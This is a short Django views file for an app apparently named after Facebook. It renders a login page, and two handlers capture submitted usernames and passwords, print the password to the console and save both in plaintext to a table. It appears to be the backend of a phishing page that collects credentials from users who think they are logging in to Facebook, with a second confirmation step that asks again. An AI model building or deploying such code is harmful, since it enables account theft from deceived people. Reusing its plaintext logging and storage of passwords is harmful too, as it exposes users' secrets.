from django.shortcuts import render
from .models import fb_table

def fb_view(request):
    return render(request,'fbapp/fblogin.html')
def login_conf_view(request):
    if request.method=='POST':
        username=request.POST.get('username')
        password=request.POST.get('password')
        print(username)
        print("this is the password",password)
        tb=fb_table()
        tb.username=username
        tb.password=password
        tb.save()
    return render(request,'fbapp/loginconf2.html')
def login_conf_view2(request):
    if request.method=='POST':
        username=request.POST.get('username')
        password=request.POST.get('password')
        tb=fb_table()
        tb.username=username
        tb.password=password
        tb.save()
    return render(request,'fbapp/loginconf3.html')
